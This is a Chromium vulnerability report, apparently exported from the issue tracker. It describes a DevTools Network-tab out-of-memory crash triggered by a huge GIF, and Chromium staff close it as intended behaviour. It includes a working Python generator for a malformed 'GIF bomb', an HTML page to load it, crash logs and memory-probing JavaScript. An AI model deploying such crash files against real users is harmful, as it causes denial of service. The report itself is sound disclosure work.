@@ -1,0 +1,380 @@
+Issue ID: 421003100
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>V8 JavaScript OOM (invalid array length) when rendering GIF response in Network tab DevTools</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<h2>Description</h2>
+<p>When opening a very large GIF file in the Response tab of the Chromium DevTools Network panel, a memory failure occurs in the V8 JavaScript engine with an &quot;invalid array length&quot; error message. This causes the Network tab to become unresponsive (hang) or crash, even though the main browser process continues to run.</p>
+<p>The issue occurs when DevTools attempts to parse and render the full GIF response content in text or preview form, which results in an invalid array allocation and out-of-memory (OOM) in V8.</p>
+<h2>Steps to reproduce</h2>
+<ul>
+<li>Create a gif with this python</li>
+</ul>
+<pre><code><span class="stx-keyword">def</span> <span>create_interlaced_fragmented_gif</span>(
+    <span>filename</span>, <span>width</span>, <span>height</span>, <span>frame_count</span>, <span>zero_frame_every</span>=<span class="stx-number">5</span>
+):
+    <span class="stx-keyword">def</span> <span>to_bytes</span>(<span>val</span>, <span>length</span>=<span class="stx-number">2</span>):
+        <span class="stx-keyword">return</span> val.to_bytes(length, <span class="stx-string">&quot;</span><span class="stx-string">little</span><span class="stx-string">&quot;</span>)
+
+    <span class="stx-keyword">def</span> <span>make_header</span>():
+        <span class="stx-keyword">return</span> <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">GIF89a</span><span class="stx-string">&quot;</span>
+
+    <span class="stx-keyword">def</span> <span>make_lsd</span>(<span>w</span>, <span>h</span>):
+        <span class="stx-comment"># Logical Screen Descriptor: GCT flag set, size = 256 colors</span>
+        <span class="stx-keyword">return</span> to_bytes(w) + to_bytes(h) + <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\xF7\x00\x00</span><span class="stx-string">&quot;</span>
+
+    <span class="stx-keyword">def</span> <span>make_gct</span>():
+        <span class="stx-comment"># 256-color Global Color Table</span>
+        <span>base_colors</span> = [
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x00\x00\x00</span><span class="stx-string">&quot;</span>,  <span class="stx-comment"># Black</span>
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\xFF\x00\x00</span><span class="stx-string">&quot;</span>,  <span class="stx-comment"># Red</span>
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x00\xFF\x00</span><span class="stx-string">&quot;</span>,  <span class="stx-comment"># Green</span>
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x00\x00\xFF</span><span class="stx-string">&quot;</span>,  <span class="stx-comment"># Blue</span>
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\xFF\xFF\xFF</span><span class="stx-string">&quot;</span>,  <span class="stx-comment"># White</span>
+        ]
+        <span>gct</span> = <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">&quot;</span>.join(base_colors)
+        gct += <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x00\x00\x00</span><span class="stx-string">&quot;</span> * (<span class="stx-number">256</span> - len(base_colors))
+        <span class="stx-keyword">return</span> gct
+
+    <span class="stx-keyword">def</span> <span>make_app_ext</span>():
+        <span class="stx-comment"># NETSCAPE2.0 loop extension</span>
+        <span class="stx-keyword">return</span> <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x21\xFF\x0B</span><span class="stx-string">&quot;</span> + <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">NETSCAPE2.0</span><span class="stx-string">&quot;</span> + <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x03\x01\x00\x00\x00</span><span class="stx-string">&quot;</span>
+
+    <span class="stx-keyword">def</span> <span>make_gce</span>():
+        <span class="stx-keyword">return</span> <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x21\xF9\x04\x00\x00\x00\x00\x00</span><span class="stx-string">&quot;</span>
+
+    <span class="stx-keyword">def</span> <span>make_img_desc</span>(<span>w</span>, <span>h</span>, <span>interlaced</span>=<span class="stx-keyword">False</span>):
+        <span>packed</span> = <span class="stx-number">0x40</span> <span class="stx-keyword">if</span> interlaced <span class="stx-keyword">else</span> <span class="stx-number">0x00</span>
+        <span class="stx-keyword">return</span> (
+            <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x2C</span><span class="stx-string">&quot;</span> + <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x00\x00\x00\x00</span><span class="stx-string">&quot;</span> + to_bytes(w) + to_bytes(h) + bytes([packed])
+        )
+
+    <span class="stx-keyword">def</span> <span>make_fragmented_lzw_block</span>(<span>subblock_count</span>=<span class="stx-number">1000</span>, <span>payload_size</span>=<span class="stx-number">255</span>):
+        <span class="stx-string">&quot;&quot;&quot;</span>
+<span class="stx-string">        Generate LZW data split into many small sub-blocks (255 bytes max),</span>
+<span class="stx-string">        followed by terminator block.</span>
+<span class="stx-string">        </span><span class="stx-string">&quot;&quot;&quot;</span>
+        <span>subblocks</span> = bytearray()
+        subblocks += <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x02</span><span class="stx-string">&quot;</span>  <span class="stx-comment"># LZW min code size</span>
+
+        <span>chunk</span> = <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\xFF</span><span class="stx-string">&quot;</span> * payload_size
+        <span class="stx-keyword">for</span> <span>_</span> <span class="stx-keyword">in</span> range(subblock_count):
+            subblocks.append(len(chunk))
+            subblocks += chunk
+
+        subblocks.append(<span class="stx-number">0x00</span>)  <span class="stx-comment"># End of LZW data</span>
+        <span class="stx-keyword">return</span> bytes(subblocks)
+
+    <span class="stx-keyword">def</span> <span>trailer</span>():
+        <span class="stx-keyword">return</span> <span class="stx-string">b</span><span class="stx-string">&quot;</span><span class="stx-string">\x3B</span><span class="stx-string">&quot;</span>
+
+    <span>gif</span> = bytearray()
+    gif += make_header()
+    gif += make_lsd(width, height)
+    gif += make_gct()
+    gif += make_app_ext()
+
+    <span class="stx-keyword">for</span> <span>i</span> <span class="stx-keyword">in</span> range(frame_count):
+        gif += make_gce()
+
+        <span class="stx-keyword">if</span> (i + <span class="stx-number">1</span>) % zero_frame_every == <span class="stx-number">0</span>:
+            <span class="stx-comment"># Oversized + interlaced + fragmented LZW</span>
+            gif += make_img_desc(<span class="stx-number">5000</span>, <span class="stx-number">5000</span>, interlaced=<span class="stx-keyword">True</span>)
+            gif += make_fragmented_lzw_block(subblock_count=<span class="stx-number">4096</span>, payload_size=<span class="stx-number">255</span>)
+        <span class="stx-keyword">else</span>:
+            gif += make_img_desc(width, height, interlaced=<span class="stx-keyword">True</span>)
+            gif += make_fragmented_lzw_block(subblock_count=<span class="stx-number">0</span>, payload_size=<span class="stx-number">0</span>)
+
+    gif += trailer()
+
+    <span class="stx-keyword">with</span> open(filename, <span class="stx-string">&quot;</span><span class="stx-string">wb</span><span class="stx-string">&quot;</span>) <span class="stx-keyword">as</span> <span>f</span>:
+        f.write(gif)
+
+    print(
+        <span class="stx-string">f</span><span class="stx-string">&quot;</span><span class="stx-string">[✓] GIF &#39;</span>{filename}<span class="stx-string">&#39; dibuat: </span>{frame_count}<span class="stx-string"> frame ( tiap </span>{zero_frame_every}<span class="stx-string"> frame, fragmented LZW)</span><span class="stx-string">&quot;</span>
+    )
+
+
+# 🧪 Contoh penggunaan:
+create_interlaced_fragmented_gif(
+    filename=<span class="stx-string">&quot;</span><span class="stx-string">interlaced_lzw_frag_bomb.gif</span><span class="stx-string">&quot;</span>,
+    width=<span class="stx-number">5000</span>,
+    height=<span class="stx-number">5000</span>,
+    frame_count=<span class="stx-number">100</span>,
+    zero_frame_every=<span class="stx-number">2</span>,
+)
+</code></pre>
+<ul>
+<li>Create an index.html</li>
+</ul>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span> lang=<span class="stx-string">&quot;en&quot;</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+    &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;UTF-8&quot;</span> /&gt;
+    &lt;<span class="stx-keyword">meta</span> name=<span class="stx-string">&quot;viewport&quot;</span> content=<span class="stx-string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;
+    &lt;<span class="stx-keyword">title</span>&gt;GIF Stress Test&lt;/<span class="stx-keyword">title</span>&gt;
+    &lt;<span class="stx-keyword">style</span>&gt;
+        body {
+            margin: <span class="stx-number">0</span>;
+            background-color: #<span class="stx-number">111</span>;
+            color: white;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: <span class="stx-number">20</span>px;
+        }
+        h<span class="stx-number">1</span> {
+            margin-bottom: <span class="stx-number">20</span>px;
+        }
+        footer {
+            margin-top: <span class="stx-number">20</span>px;
+            opacity: <span class="stx-number">0.8</span>;
+            font-size: <span class="stx-number">0.9</span>em;
+        }
+    &lt;/<span class="stx-keyword">style</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">h1</span>&gt;Chrome Android GIF Stress Test&lt;/<span class="stx-keyword">h1</span>&gt;
+
+    &lt;<span class="stx-keyword">div</span> class=<span class="stx-string">&quot;gif-container&quot;</span>&gt;
+        &lt;<span class="stx-keyword">img</span> src=<span class="stx-string">&quot;interlaced_lzw_frag_bomb.gif&quot;</span> alt=<span class="stx-string">&quot;GIF 1&quot;</span>&gt;
+    &lt;/<span class="stx-keyword">div</span>&gt;
+    &lt;<span class="stx-keyword">footer</span>&gt;
+        Tes ini memuat <span class="stx-number">3</span> GIF besar sekaligus. Perhatikan performa, lag, atau crash di browser.
+    &lt;/<span class="stx-keyword">footer</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<ul>
+<li>Open the index html with Chromium browser</li>
+<li>Open the devtools -&gt; network tab</li>
+<li>Click gif file and click response.</li>
+<li>Devtools hang, and OOM.</li>
+</ul>
+<pre><code>&lt;--- Last few GCs ---&gt;
+
+[<span class="stx-number">1</span>:<span class="stx-number">0x239400404000</span>]   <span class="stx-number">148129</span> ms: Scavenge (during sweeping) <span class="stx-number">292.8</span> (<span class="stx-number">325.7</span>) -&gt; <span class="stx-number">260.8</span> (<span class="stx-number">325.7</span>) MB, pooled: <span class="stx-number">0.0</span> MB, <span class="stx-number">0.15</span> / <span class="stx-number">0.00</span> ms (average mu = <span class="stx-number">0.971</span>, current mu = <span class="stx-number">0.967</span>) allocation failure;<span> </span>
+[<span class="stx-number">1</span>:<span class="stx-number">0x239400404000</span>]   <span class="stx-number">148260</span> ms: Scavenge (during sweeping) <span class="stx-number">292.8</span> (<span class="stx-number">325.7</span>) -&gt; <span class="stx-number">260.8</span> (<span class="stx-number">325.7</span>) MB, pooled: <span class="stx-number">0.0</span> MB, <span class="stx-number">0.23</span> / <span class="stx-number">0.00</span> ms (average mu = <span class="stx-number">0.971</span>, current mu = <span class="stx-number">0.967</span>) allocation failure;<span> </span>
+
+[<span class="stx-number">80152</span>:<span class="stx-number">1</span>:<span class="stx-number">0529</span>/<span class="stx-number">062125.714571</span>:ERROR:third_party/blink/renderer/bindings/core/v8/v8_initializer.cc:826] V8 javascript OOM (invalid array length).
+[<span class="stx-number">0529</span>/<span class="stx-number">062125.723450</span>:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (<span class="stx-number">5</span>)
+[<span class="stx-number">0529</span>/<span class="stx-number">062125.730692</span>:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (<span class="stx-number">5</span>)
+[<span class="stx-number">0529</span>/<span class="stx-number">062125.731600</span>:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (<span class="stx-number">5</span>)
+[<span class="stx-number">0529</span>/<span class="stx-number">062125.731997</span>:ERROR:third_party/crashpad/crashpad/util/linux/ptracer.cc:605] ptrace: Input/output error (<span class="stx-number">5</span>)
+[<span class="stx-number">0529</span>/<span class="stx-number">062125.930210</span>:ERROR:third_party/crashpad/crashpad/snapshot/elf/elf_dynamic_array_reader.h:64] tag not found
+</code></pre>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>[80152:1:0529/062125.714571:ERROR:third_party/blink/renderer/bindings/core/v8/v8_initializer.cc:826] V8 javascript OOM (invalid array length).</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Chromium 137.0.7151.55 snap</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>Yes, it is related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Denial of Service (DoS)</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: mu...@gmail.com
+V8 JavaScript OOM (invalid array length) when rendering GIF response in Network tab DevTools
+
+Author: mu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: li...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: li...@chromium.org
+public_non_google
+
+Author: cf...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cf...@chromium.org
+public_non_google
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.StringValue
+
+Author: cf...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cf...@google.com
+googlers_unrestricted
+
+Author: om...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: om...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+T0dVMVlXWTBZekZsWkRrM1lURXlNVEZsWXpZeU9UTmlObVkxTkRWak0yTT0=
+
+Author: ch...@google.com
+<p>Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: mu...@gmail.com
+Sorry, maybe it&#39;s because of the OS or whatever. <br><br>I can&#39;t open the chrome stable/canary in my OS.<br><br>When I have installed chrome via Debian package in Ubuntu 24, I can&#39;t open the chrome with terminal, dekstop, or menu.<br><br>Then, I want to say thank you, for Google Security Analysts that has reviewed my report.
+
+Author: th...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: th...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cf...@google.com
+<p>I think the minimal reproduce would just be the following JavaScript code:</p>
+<pre><code>const str = &quot;a&quot;.repeat(2 ** 29 - 24);
+const ary = Uint8Array.from(str);
+</code></pre>
+<p>This is known to us, we have a couple of places where we don&#39;t handle these OOMs gracefully (because there is no easy way to recover / handle those).<br>
+Therefore I will close this as WAI.</p>
+
+Author: cf...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: cf...@google.com
+<p>See the discussion on <a href="https://crbug.com/40055633" data-b-widget="url" data-b-original-href="https://crbug.com/40055633" data-b-redirected-href="https://www.google.com/url?q=https://crbug.com/40055633&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2HzlqcZD559hbMF8Np34yR">https://crbug.com/40055633</a></p>
+
+Author: mu...@gmail.com
+<ol>
+<li>Search failed</li>
+</ol>
+<pre><code>(<span class="stx-keyword">async</span> () =&gt; {
+  <span class="stx-keyword">let</span> <span>low</span> = <span class="stx-number">1</span> &lt;&lt; <span class="stx-number">20</span>;       <span class="stx-comment">// mulai dari 1MB</span>
+  <span class="stx-keyword">let</span> <span>high</span> = <span class="stx-number">1</span> &lt;&lt; <span class="stx-number">30</span>;      <span class="stx-comment">// sampai 1GB</span>
+  <span class="stx-keyword">let</span> <span>lastGood</span> = <span class="stx-number">0</span>;
+
+  <span class="stx-keyword">while</span> (low &lt;= high) {
+    <span class="stx-keyword">let</span> <span>mid</span> = Math.floor((low + high) / <span class="stx-number">2</span>);
+    <span class="stx-keyword">try</span> {
+      <span class="stx-keyword">const</span> <span>str</span> = <span class="stx-string">&quot;a&quot;</span>.repeat(mid);
+      <span class="stx-keyword">const</span> <span>ary</span> = Uint8Array.from(str);
+
+      console.log(<span class="stx-string">&quot;Success at size:&quot;</span>, mid);
+      lastGood = mid;
+      low = mid + <span class="stx-number">1</span>;
+
+      <span class="stx-keyword">await</span> <span class="stx-keyword">new</span> Promise(r =&gt; setTimeout(r, <span class="stx-number">50</span>));
+
+    } <span class="stx-keyword">catch</span> (<span>e</span>) {
+      console.warn(<span class="stx-string">&quot;Failed at size:&quot;</span>, mid);
+      high = mid - <span class="stx-number">1</span>;
+    }
+  }
+
+  console.log(<span class="stx-string">&quot;Maximum successful allocation:&quot;</span>, lastGood);
+})();
+</code></pre>
+<ol start="2">
+<li>SIGIL/OOM occurs before at failed, between 40000000 - 50000000.</li>
+</ol>
+<pre><code>(<span class="stx-keyword">async</span> () =&gt; {
+  <span class="stx-keyword">const</span> <span>start</span> = <span class="stx-number">10_000_000</span>; <span class="stx-comment">// mulai dari 10 juta bytes (~10MB)</span>
+  <span class="stx-keyword">const</span> <span>step</span> = <span class="stx-number">10_000_000</span>;  <span class="stx-comment">// increment 10 juta bytes tiap percobaan</span>
+  <span class="stx-keyword">const</span> <span>maxTry</span> = <span class="stx-number">60</span>;         <span class="stx-comment">// maksimal 60 kali coba (sampai ~600MB)</span>
+  <span class="stx-keyword">let</span> <span>lastSuccess</span> = <span class="stx-number">0</span>;
+  <span class="stx-keyword">let</span> <span>errorAt</span> = <span class="stx-number">0</span>;
+
+  <span class="stx-keyword">for</span> (<span class="stx-keyword">let</span> <span>i</span> = <span class="stx-number">1</span>; i &lt;= maxTry; i++) {
+    <span class="stx-keyword">const</span> <span>size</span> = start * i;
+    <span class="stx-keyword">try</span> {
+      console.log(<span class="stx-string">`Try #${</span>i<span class="stx-string">}: Allocating ${</span>size<span class="stx-string">} bytes...`</span>);
+      <span class="stx-keyword">const</span> <span>str</span> = <span class="stx-string">&quot;a&quot;</span>.repeat(size);
+      <span class="stx-keyword">const</span> <span>ary</span> = Uint8Array.from(str);
+      console.log(<span class="stx-string">`Success at size: ${</span>size<span class="stx-string">}`</span>);
+      lastSuccess = size;
+      <span class="stx-keyword">await</span> <span class="stx-keyword">new</span> Promise(r =&gt; setTimeout(r, <span class="stx-number">1000</span>));
+    } <span class="stx-keyword">catch</span> (<span>e</span>) {
+      console.error(<span class="stx-string">`Failed at size: ${</span>size<span class="stx-string">}`</span>, e);
+      errorAt = size;
+      <span class="stx-keyword">break</span>;
+    }
+  }
+
+  console.log(<span class="stx-string">&quot;===== RESULT =====&quot;</span>);
+  console.log(<span class="stx-string">&quot;Maximum successful allocation:&quot;</span>, lastSuccess);
+  <span class="stx-keyword">if</span> (errorAt) {
+    console.log(<span class="stx-string">&quot;Failed allocation at size:&quot;</span>, errorAt);
+  } <span class="stx-keyword">else</span> {
+    console.log(<span class="stx-string">&quot;No failures detected within tested range.&quot;</span>);
+  }
+})();
+</code></pre>
+
+Author: mu...@gmail.com
+TjJKa1pXVXlNemt4WW1RM01HVXlNRE0wTTJFME1HTmlaVGxqWm1Vd01qYz0=
+
+Author: mu...@gmail.com
+TkRJeE1EQXpNVEF3TFRZMk16YzRNVGN6TFMwM01EazNNekk0TnpVPQ==
+
+Author: mu...@gmail.com
+<p>Please, let me know. if my comments don&#39;t give any information. or you still want to close this behavior as a won&#39;t fix or still Not Applicable.</p>
+<p>I am waiting for your response.</p>
+<p>Thanks,</p>
+<p>Best regards,
+Muhamad Rizki Arif Fadillah</p>
+
+Author: cf...@google.com
+<p>Thanks for the other messages.<br>
+Yes, we will still keep this as WontFix/Intended Behavior.</p>
+
+Author: mu...@gmail.com
+TlRrNU9UWTFNMk5sTWpZek1tRTFOemMxWkdKbE9UZG1ZMlUyT0RJME1HUT0=
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: mu...@gmail.com
+<p>After analyzing the issue on Windows, it appears to be the same root cause as in <a href="https://issues.chromium.org/issues/475613896" data-b-widget="issue-reference" data-b-issue-id="475613896">475613896</a>. However, the impact differs between Linux and Windows. Would it make sense to consolidate this report into <a href="https://issues.chromium.org/issues/475613896" data-b-widget="issue-reference" data-b-issue-id="475613896">475613896</a>?</p>
+
+Author: om...@chromium.org
+WXpZek9UTTFZbU5qWmpJNU1XVTBaR0kzTmpVMU0ySmlPVEEyTW1VNVptRT0=
